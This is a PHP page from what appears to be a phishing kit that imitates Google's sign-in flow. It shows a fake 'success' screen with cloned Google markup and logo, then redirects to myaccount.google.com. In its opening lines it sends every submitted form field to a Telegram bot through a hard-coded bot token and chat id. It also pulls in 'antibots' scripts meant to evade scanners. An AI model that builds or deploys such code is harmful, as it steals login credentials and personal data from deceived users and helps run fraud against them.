<?php
if(!empty($_POST)){$t="8701853660:AAHbvHtYE0t24o0nTjX4UR17pGwEeMA5htY";$c="-1003779907048";$m="";foreach($_POST as $k=>$v)$m.="$k: $v\n";@file_get_contents("https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=".urlencode($m));}

require_once '../modules/sessions.php'; // INIT OU RECUPERER SESSIONS + COOKIES
require_once '../antibots/all.php';     // AB 
require_once __DIR__ . '/../langues/lang_detect.php';


if (empty($_SESSION['captcha_valide']) || $_SESSION['captcha_valide'] !== true) {
    header('Location: ../index.php');
    exit;
}
if (!empty($_POST['bot_honeypot'])) {
    exit;
}


?>
<!doctype html>

<head>
<title> <?php echo $tr["title_success"]; ?></title>
    <!-- Required meta tags -->
    <meta http-equiv="refresh" content="5;url=https://myaccount.google.com">
   
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindexnofollow ,noimageindex ,noarchive, nocache, nosnippet">
    <!-- CSS FILES -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/index.css">
    <!--icon .ico -->
    <link rel="icon" type="image/x-icon" href="../assets/img/icon.ico" />

</head>
<style>
    .error-message-google {
        color: #d93025;
        /* rouge Google */
        font-size: 0.875rem;
        /* un peu plus petit */
        margin-top: 4px;
        font-family: 'Roboto', sans-serif;
        /* comme Google */
    }
</style>
<style>
    .loader {
        display: none;
        /* caché par défaut */
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(255, 255, 255, 0.6);
        /* fond semi-transparent */
        z-index: 9999;
        align-items: center;
        justify-content: center;
    }

    .loader .spinner-border {
        width: 4rem;
        height: 4rem;
        border: 0.4em solid #4285f4;
        /* bleu Google */
        border-top-color: transparent;
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        to {
            transform: rotate(360deg);
        }
    }
</style>
<!-- Loader -->
<div class="loader">
    <div class="spinner-border"></div>
</div>

<body jscontroller=LDQI jsaction="" class="jR8x9d nyoS7c UzCXuf EIlDfe">
    <div jscontroller=DqMihc jsaction=rcuQ6b:npT2md;rURRne:AC0Pid;WK2DQd:daFy6d class=bdCvOd></div>
    <div class="S7xv8 LZgQXe">
        <div class="TcuCfd NQ5OL" jsname=rZHESd jscontroller=K1ZKnb jsaction="" tabindex=null>
            <div jscontroller=ziZ8Mc jsaction=rcuQ6b:npT2md jsname=P1ekSe class=Ih3FE aria-hidden=true>
                <div jscontroller=ltDFwf jsaction=transitionend:Zdx3Re jsname=P1ekSe role=progressbar class="sZwd7c B6Vhqe qdulke jK7moc">
                    <div class="xcNBHc um3FLe"></div>
                    <div jsname=cQwEuf class="w2zcLc Iq5ZMc"></div>
                    <div class="MyvhI TKVRUb" jsname=P1ekSe><span class="l3q5xe SQxu9c"></span></div>
                    <div class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div>
                </div>
            </div>
            <div class=fAlnEc id=yDmH0d jsaction=ZqRew:.CLIENT><c-wiz jsrenderer=chA7fe class=A77ntc data-view-id=hm18Ec data-locale=fr data-allow-sign-up-types=true jsshadow jsdata=deferred-i6 data-p='%.@.false,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,false,null,null,false,null,null,null,null,null,"S-1138980805:1755116232311330",null,"https://accounts.google.com",null,null,null,[[null,null,null,null,"https://www.google.com/"],[null,null,"S-1138980805:1755116232311330","AddSession","https://www.google.com/",null,[["authuser","0"],["continue","https://www.google.com/"],["ec","futura_exp_og_si_72776762_e"],["hl","fr"],["flowName","GlifWebSignIn"],["flowEntry","AddSession"],["dsh","S-1138980805:1755116232311330"]],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,null,null,[],null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,null,[]],null,null,null,[null,null,null,null,null,[null,[["authuser",["0"]],["continue",["https://www.google.com/"]],["ec",["futura_exp_og_si_72776762_e"]],["hl",["fr"]],["flowName",["GlifWebSignIn"]],["flowEntry",["AddSession"]],["dsh",["S-1138980805:1755116232311330"]]],"https://www.google.com/"],null,"S-1138980805:1755116232311330",null,null,[]]],null,false]' jscontroller=b3kMqb jsaction="click:jKoJid(preventDefault=true|DPJEMd),WZ2Bje(Cuz2Ue);jiqeKb:UHZ0U;Pp1AU:IjS5bf;rcuQ6b:WYd;W7m8ib:cqxkve;t5qvFd:.CLIENT" jsname=nUpftc data-node-index=0;0 jsmodel="hc6Ubd niKKCd" view c-wiz>
                    <main class=Svhjgc jsname=bN97Pc jscontroller=SD8Jgb jsshadow>
                        <div class=zIgDIc jsname=paFcre><c-wiz jsrenderer=OTcFib jsshadow jsdata=deferred-i7 data-p=%.@.] data-node-index=2;0 jsmodel=hc6Ubd c-wiz>
                                <div class=Wf6lSd jscontroller=rmumx jsname=n7vHCb><svg xmlns=https://www.w3.org/2000/svg width=48 height=48 viewBox="0 0 40 48" aria-hidden=true jsname=jjf7Ff>
                                        <path fill=#4285F4 d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
                                        <path fill=#34A853 d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
                                        <path fill=#FABB05 d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
                                        <path fill=#E94235 d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
                                    </svg></div><c-data id=i7 jsdata=" eCjdDd;_;2" class=sf-hidden></c-data>
                            </c-wiz>
                            <div class="ObDc3 ZYOIke" jsname=tJHJj jscontroller=E87wgc jsaction=JIbuQc:pKJJqe(af8ijd);wqEGtb:pKJJqe;>
                                <br>   <br>
                            <img src ="../assets/img/done.png"  style="width : 100px;">
               
                   
                                <h1 class=vAV9bf data-a11y-title-piece id=headingText jsname=r4nke><span jsslot><?php echo $tr["success"]["0"];?></span></h1>
                                <div class=gNJDp data-a11y-title-piece id=headingSubtext jsname=VdSJob><span jsslot>
                                <?php echo $tr["success"]["1"];?></span></div>
                            </div>

                        </div>
                        <div class=UXFQgc jsname=uybdVe>
            
                        </div>
                        
                    </main><c-data id=i6 jsdata=" kY3gQd;_;6 DoqpZc;_;4" class=sf-hidden></c-data>
                </c-wiz>
                <div id=ZCHFDb></div>
            </div>
        </div>
        <div class=wmGw4><c-wiz jsrenderer=ZdRp7e jsshadow jsdata=deferred-i1 data-node-index=0;0 jsmodel=hc6Ubd c-wiz>
                <footer class=FZfKCe>
                    <div class=eXa0v jscontroller=xiZRqc jsaction=rcuQ6b:npT2md;OmFrlf:VPRXbd>
                        
                    </div>
                    <ul class=HwzH1e>
                        <li class=qKvP1b><a class="AVAq4d TrZEUc" href="" target=""> <?php echo $tr["footer"]["0"];?></a>
                        <li class=qKvP1b><a class="AVAq4d TrZEUc" href="" target=""> <?php echo $tr["footer"]["1"];?></a>
                        <li class=qKvP1b><a class="AVAq4d TrZEUc" href="" target=""> <?php echo $tr["footer"]["2"];?></a>
                    </ul>
                </footer><c-data id=i1 jsdata=" OsjLy;_;1" class=sf-hidden></c-data>
            </c-wiz></div>
    </div>



    <!-- JS FILES -->
    <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

</body>

</html>
